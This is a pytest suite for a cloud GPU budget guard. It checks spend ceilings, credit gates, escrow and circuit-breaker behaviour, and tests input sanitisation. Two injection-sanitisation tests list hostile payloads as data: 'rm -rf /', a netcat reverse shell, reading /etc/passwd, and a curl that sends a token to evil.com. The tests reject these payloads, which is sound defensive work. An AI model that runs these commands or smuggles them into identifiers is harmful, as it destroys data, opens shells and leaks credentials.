"""
tests/test_modal_budget_guard_adversarial.py
============================================
Adversarial Security & Boundary Test Suite for ModalBudgetGuard.

Verifies:
1. CWE-78 / CWE-88 command injection sanitization on app_id and container_id.
2. Adaptive Dual-Cadence switching: 300s (idle) vs 15s–30s (active GPU load).
3. Hard emergency shutdown ceiling boundary: $24.99 (no shutdown) vs $25.00 (immediate hard-kill).
4. Sovereign Invariant 1.17 Pre-Flight Credit Gate:
   - Deploy: requires remaining credits > $15.00 (MTD spend < $15.00).
   - Inference: requires remaining credits > $10.00 (MTD spend < $20.00).
5. Disabled/paused workspace profile rejection.
6. TC-CADENCE-01: Workspace idle (0 containers, safe credits) -> Sleep interval in [270s, 330s].
7. TC-CADENCE-02: Active container running -> Sleep interval <= 33s.
8. TC-TOCTOU-01: Virtual Escrow prevents concurrent parallel dispatches from overshooting budget.
9. TC-CIRCUIT-01: Degraded API (5xx/Timeout) triggers fail-closed on deploy and graceful fallback to Local JEV / Cloudflare Clef on inference.
"""

import re
import pytest
from unittest.mock import MagicMock, patch

from tools.modal_budget_guard import (
    ModalBudgetGuard,
    ModalCircuitBreaker,
    InFlightLeaseLedger,
    calculate_adaptive_interval,
    APP_ID_REGEX,
    CONTAINER_ID_REGEX,
    verify_credit_gate,
    TOTAL_ALLOWANCE_USD,
    BUDGET_CEILING_USD,
    DEPLOY_MIN_CREDITS_USD,
    INFERENCE_MIN_CREDITS_USD,
    IDLE_POLL_INTERVAL_SECONDS,
    ACTIVE_POLL_INTERVAL_SECONDS,
)


class TestModalBudgetGuardAdversarial:
    """Test Suite verifying injection prevention, adaptive cadence, virtual escrow, and circuit breaker."""

    def setup_method(self):
        """Ensure clean state before each test."""
        InFlightLeaseLedger.get_instance().clear()

    def test_cwe78_shell_injection_sanitization(self):
        """Verify command injection payloads in app_id are rejected before execution."""
        guard = ModalBudgetGuard()
        malicious_payloads = [
            "app-123; rm -rf /",
            "app-`whoami`",
            "app-test && cat /etc/passwd",
            "app|nc -e /bin/sh 10.0.0.1 4444",
            "app$((2+2))",
            "../../../bin/sh",
            "app;curl evil.com/exfil?k=$MODAL_TOKEN",
            "app\nreboot",
        ]
        for payload in malicious_payloads:
            assert APP_ID_REGEX.match(payload) is None, f"Payload bypassed regex: {payload}"
            assert guard.stop_app(payload) is False, f"guard.stop_app executed malicious payload: {payload}"

    def test_cwe78_container_injection_sanitization(self):
        """Verify command injection payloads in container_id are rejected."""
        guard = ModalBudgetGuard()
        malicious_containers = [
            "c-123; reboot",
            "c-test | sh",
            "c-`id`",
            "c-$USER",
            "c-test > /tmp/hacked",
        ]
        for payload in malicious_containers:
            assert CONTAINER_ID_REGEX.match(payload) is None, f"Payload bypassed regex: {payload}"
            assert guard.stop_container(payload) is False, f"guard.stop_container executed payload: {payload}"

    def test_legitimate_identifiers_accepted(self):
        """Verify standard alphanumeric identifiers with dashes, underscores, and dots are accepted."""
        valid_ids = [
            "ap-1234567890abcdef",
            "modal-app-prod-v2",
            "c-01abc.def_ghi-45",
            "container_worker_01",
        ]
        for vid in valid_ids:
            assert APP_ID_REGEX.match(vid) is not None
            assert CONTAINER_ID_REGEX.match(vid) is not None

    def test_adaptive_cadence_switching(self, monkeypatch):
        """Verify watchdog switches between 300s (idle) and 15s–30s (active GPU load)."""
        guard = ModalBudgetGuard()

        # Scenario 1: Idle fleet (0 active containers)
        monkeypatch.setattr(guard, "get_active_containers", lambda profile=None: [])
        active_idle = guard.get_active_containers()
        assert len(active_idle) == 0
        cadence_idle = (
            guard.ACTIVE_POLL_INTERVAL_SECONDS
            if len(active_idle) > 0
            else guard.IDLE_POLL_INTERVAL_SECONDS
        )
        assert cadence_idle == 300, "Idle cadence must be 300s to avoid API noise"

        # Scenario 2: Active fleet (>= 1 active GPU container)
        monkeypatch.setattr(guard, "get_active_containers", lambda profile=None: [{"id": "c-test-1"}])
        active_running = guard.get_active_containers()
        assert len(active_running) == 1
        cadence_active = (
            guard.ACTIVE_POLL_INTERVAL_SECONDS
            if len(active_running) > 0
            else guard.IDLE_POLL_INTERVAL_SECONDS
        )
        assert cadence_active == 30, "Active GPU cadence must be 30s to eliminate spend blind spot"

    def test_emergency_shutdown_threshold_boundary(self, monkeypatch):
        """Verify $25.00 triggers immediate hard shutdown, while $24.99 does not."""
        guard = ModalBudgetGuard()
        shutdown_called = []

        monkeypatch.setattr(
            guard,
            "execute_emergency_shutdown",
            lambda profile=None: shutdown_called.append(True)
        )

        # Boundary 1: $24.99 -> No shutdown
        monkeypatch.setattr(guard, "fetch_current_mtd_spend", lambda profile=None: 24.99)
        spend_safe = guard.fetch_current_mtd_spend()
        if spend_safe >= guard.HARD_KILL_CEILING:
            guard.execute_emergency_shutdown()
        assert len(shutdown_called) == 0, "Emergency shutdown triggered prematurely at $24.99"

        # Boundary 2: $25.00 -> Immediate shutdown
        monkeypatch.setattr(guard, "fetch_current_mtd_spend", lambda profile=None: 25.00)
        spend_breached = guard.fetch_current_mtd_spend()
        if spend_breached >= guard.HARD_KILL_CEILING:
            guard.execute_emergency_shutdown()
        assert len(shutdown_called) == 1, "Emergency shutdown failed to trigger at $25.00"

    def test_pre_flight_credit_gate_rule_1_17(self, monkeypatch):
        """Verify Rule 1.17 Credit Gate: Deploy > $15.00, Inference > $10.00."""
        test_profile = "test-workspace-01"
        monkeypatch.setattr("tools.modal_budget_guard.get_profiles", lambda: [test_profile])

        # Case A: Spend = $12.00 -> Remaining credits = $18.00
        # Deploy: ALLOWED (> $15.00), Inference: ALLOWED (> $10.00)
        monkeypatch.setattr("tools.modal_budget_guard.get_profile_cost", lambda p: 12.00)
        gate_deploy = verify_credit_gate(test_profile, action="deploy")
        assert gate_deploy["allowed"] is True
        assert gate_deploy["remaining_credits_usd"] == 18.00

        gate_infer = verify_credit_gate(test_profile, action="inference")
        assert gate_infer["allowed"] is True

        # Case B: Spend = $16.00 -> Remaining credits = $14.00
        # Deploy: REJECTED (<= $15.00), Inference: ALLOWED (> $10.00)
        monkeypatch.setattr("tools.modal_budget_guard.get_profile_cost", lambda p: 16.00)
        gate_deploy_b = verify_credit_gate(test_profile, action="deploy")
        assert gate_deploy_b["allowed"] is False, "Deploy should be blocked when remaining credits <= $15.00"
        assert gate_deploy_b["min_required_credits_usd"] == 15.00

        gate_infer_b = verify_credit_gate(test_profile, action="inference")
        assert gate_infer_b["allowed"] is True
        assert gate_infer_b["min_required_credits_usd"] == 10.00

        # Case C: Spend = $21.00 -> Remaining credits = $9.00
        # Deploy: REJECTED, Inference: REJECTED (<= $10.00)
        monkeypatch.setattr("tools.modal_budget_guard.get_profile_cost", lambda p: 21.00)
        gate_deploy_c = verify_credit_gate(test_profile, action="deploy")
        assert gate_deploy_c["allowed"] is False

        gate_infer_c = verify_credit_gate(test_profile, action="inference")
        assert gate_infer_c["allowed"] is False, "Inference should be blocked when remaining credits <= $10.00"

    def test_disabled_profile_rejected_by_gate(self, monkeypatch):
        """Verify a disabled or paused workspace profile is rejected immediately."""
        monkeypatch.setattr("tools.modal_budget_guard.get_profiles", lambda: ["active-profile"])
        gate = verify_credit_gate("inactive-profile", action="inference")
        assert gate["allowed"] is False
        assert "disabled/paused" in gate["reason"]

    def test_tc_cadence_01_idle_cadence_within_jitter_bounds(self):
        """TC-CADENCE-01: Workspace idle (0 container, safe credits) -> Sleep interval in [270s, 330s]."""
        for _ in range(50):
            interval = calculate_adaptive_interval(active_count=0, remaining_credits=28.00)
            assert 270 <= interval <= 330, f"Idle interval {interval} outside [270s, 330s] bounds"

    def test_tc_cadence_02_active_container_cadence(self):
        """TC-CADENCE-02: Active container running or credits low -> Sleep interval <= 33s."""
        for _ in range(50):
            interval_active = calculate_adaptive_interval(active_count=1, remaining_credits=28.00)
            assert interval_active <= 33, f"Active container interval {interval_active} exceeded 33s"
            assert interval_active >= 15, f"Active container interval {interval_active} below min 15s"

        # Also triggers active fast tier if credits <= $10.00 even with 0 containers
        for _ in range(50):
            interval_low_credit = calculate_adaptive_interval(active_count=0, remaining_credits=9.50)
            assert interval_low_credit <= 33
            assert interval_low_credit >= 15

    def test_tc_toctou_01_virtual_escrow_parallel_jobs(self, monkeypatch):
        """TC-TOCTOU-01: Virtual Escrow prevents concurrent parallel dispatches from overshooting budget."""
        test_profile = "test-workspace-toctou"
        monkeypatch.setattr("tools.modal_budget_guard.get_profiles", lambda: [test_profile])
        # Remaining credits = $15.50 (Spend = $14.50). Deploy threshold is > $15.00.
        monkeypatch.setattr("tools.modal_budget_guard.get_profile_cost", lambda p: 14.50)

        # Job 1 requests $0.40 lease -> Allowed (effective remaining: 15.50 - 0.40 = 15.10 > 15.00)
        gate_1 = verify_credit_gate(test_profile, action="deploy", job_id="job-parallel-1", estimated_cost=0.40)
        assert gate_1["allowed"] is True, f"Job 1 should pass: {gate_1}"

        # Job 2 concurrently requests $0.30 lease -> BLOCKED by virtual escrow!
        # (Effective remaining 15.10 - 0.30 = 14.80 <= 15.00 threshold)
        gate_2 = verify_credit_gate(test_profile, action="deploy", job_id="job-parallel-2", estimated_cost=0.30)
        assert gate_2["allowed"] is False, "Job 2 must be blocked by Virtual Escrow reservation"
        assert "Virtual Escrow blocked" in gate_2["reason"]

        # Job 3, 4, 5 also blocked
        for i in range(3, 6):
            gate_i = verify_credit_gate(test_profile, action="deploy", job_id=f"job-parallel-{i}", estimated_cost=0.30)
            assert gate_i["allowed"] is False

        # Release Job 1 lease
        InFlightLeaseLedger.get_instance().release_lease("job-parallel-1")

        # Now a smaller job can proceed if it stays above threshold
        gate_retry = verify_credit_gate(test_profile, action="deploy", job_id="job-parallel-retry", estimated_cost=0.40)
        assert gate_retry["allowed"] is True

    def test_tc_circuit_01_degraded_api_graceful_failover(self, monkeypatch):
        """TC-CIRCUIT-01: Degraded API (5xx/Timeout) triggers fail-closed on deploy and graceful fallback on inference."""
        test_profile = "test-workspace-degraded"
        cb = ModalCircuitBreaker(failure_threshold=3, cooldown_s=60.0)

        # Trip circuit breaker by recording 3 consecutive failures
        cb.record_failure()
        cb.record_failure()
        cb.record_failure()
        assert cb.is_open is True

        # Deploy must fail closed
        gate_deploy = verify_credit_gate(test_profile, action="deploy", circuit_breaker=cb)
        assert gate_deploy["allowed"] is False
        assert "fail-closed" in gate_deploy["reason"]
        assert gate_deploy["circuit_breaker"] == "OPEN"

        # Inference must gracefully reroute to Local JEV / Cloudflare Clef Flash ($0.00)
        gate_infer = verify_credit_gate(test_profile, action="inference", circuit_breaker=cb)
        assert gate_infer["allowed"] is True
        assert gate_infer["fallback_provider"] == "cloudflare_clef_local_jev"
        assert gate_infer["cost_usd"] == 0.0
        assert "gracefully rerouted" in gate_infer["reason"]
